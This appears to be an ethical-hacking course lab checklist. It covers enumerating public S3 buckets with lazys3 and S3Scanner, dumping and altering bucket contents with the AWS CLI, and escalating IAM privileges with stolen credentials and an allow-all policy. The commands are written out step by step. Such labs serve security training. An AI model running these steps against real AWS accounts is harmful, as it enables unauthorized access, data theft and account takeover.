# Lab Tasks Checklist: Cloud Computing Hacking

## Lab 1: Perform S3 Bucket Enumeration

### **Lab Scenario**

S3 bucket enumeration involves discovering publicly accessible S3 buckets to gather sensitive data. Misconfigured buckets pose a significant threat as they allow attackers to view, modify, or delete data.

### **Lab Objectives**

- Enumerate S3 buckets using tools like lazys3, S3Scanner, and the S3Bucketlist Firefox extension.

### **Lab Environment**

- **Virtual Machines**: Parrot Security
- **Tools**: lazys3, S3Scanner, S3Bucketlist Firefox extension
- **Permissions**: Administrator access
- **Internet Connection**: Required

### **Checklist**

#### Using lazys3

1. [ ]  Log in to the Parrot Security VM.
2. [ ]  Navigate to the lazys3 directory: `cd lazys3-master/`.
3. [ ]  Run the lazys3 script: `ruby lazys3.rb`.
4. [ ]  Search buckets for a specific company: `ruby lazys3.rb [CompanyName]`.
5. [ ]  Document discovered buckets and permissions.

#### Using S3Scanner

1. [ ]  Navigate to the S3Scanner directory: `cd S3Scanner/`.
2. [ ]  Install dependencies: `pip3 install -r requirements.txt`.
3. [ ]  Enumerate buckets: `python3 ./s3scanner.py sites.txt`.
4. [ ]  Log results in `buckets.txt` or dump contents locally: `python3 ./s3scanner.py --dump names.txt`.
5. [ ]  Document findings and analyze open buckets.

#### Using S3Bucketlist Firefox Extension

1. [ ]  Install the S3Bucketlist extension from the Firefox Add-ons page.
2. [ ]  Browse target websites and open the S3Bucketlist panel to view recorded buckets.
3. [ ]  Analyze discovered buckets for permissions and contents.
4. [ ]  Document results.

---

## Lab 2: Exploit S3 Buckets

### **Lab Scenario**

Exploiting S3 buckets involves taking advantage of misconfigurations to access, upload, or delete data within buckets.

### **Lab Objectives**

- Exploit open S3 buckets using AWS CLI to perform unauthorized operations.

### **Lab Environment**

- **Virtual Machines**: Parrot Security
- **Tools**: AWS CLI
- **Permissions**: Administrator access
- **Internet Connection**: Required

### **Checklist**

1. [ ]  Install AWS CLI: `pip3 install awscli`.
2. [ ]  Configure AWS CLI:
    - Command: `aws configure`.
    - Enter Access Key, Secret Key, region (e.g., `us-east-1`), and default output format (`json`).
3. [ ]  List directories in the target bucket:
    - Command: `aws s3 ls s3://[BucketName]`.
4. [ ]  Upload a file to the bucket:
    - Create a file: `echo "You have been hacked" > Hack.txt`.
    - Upload: `aws s3 mv Hack.txt s3://[BucketName]`.
5. [ ]  Verify the file upload via the browser.
6. [ ]  Delete the uploaded file:
    - Command: `aws s3 rm s3://[BucketName]/Hack.txt`.
7. [ ]  Document actions and findings.

---

## Lab 3: Perform Privilege Escalation

### **Lab Scenario**

Privilege escalation involves exploiting misconfigured user policies to gain higher privileges in an AWS environment.

### **Lab Objectives**

- Exploit misconfigured IAM user policies to escalate privileges.

### **Lab Environment**

- **Virtual Machines**: Parrot Security
- **Tools**: AWS CLI
- **Permissions**: Administrator access
- **Internet Connection**: Required

### **Checklist**

1. [ ]  Log in to Parrot Security and configure AWS CLI using stolen credentials:
    - Command: `aws configure`.
2. [ ]  Create a user policy:
    - Command: `vim user-policy.json`.
    - Content:
        
        ```json
        {
          "Version": "2012-10-17",
          "Statement": {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
          }
        }
        ```
        
3. [ ]  Save the policy and create it in AWS:
    - Command: `aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json`.
4. [ ]  Attach the policy to the target user:
    - Command: `aws iam attach-user-policy --user-name [TargetUsername] --policy-arn arn:aws:iam::[AccountID]:policy/user-policy`.
5. [ ]  List attached policies to confirm escalation:
    - Command: `aws iam list-attached-user-policies --user-name [TargetUsername]`.
6. [ ]  Use elevated privileges to perform actions like listing IAM users:
    - Command: `aws iam list-users`.
7. [ ]  Document all steps and findings.

---
---

# Step-by-Step

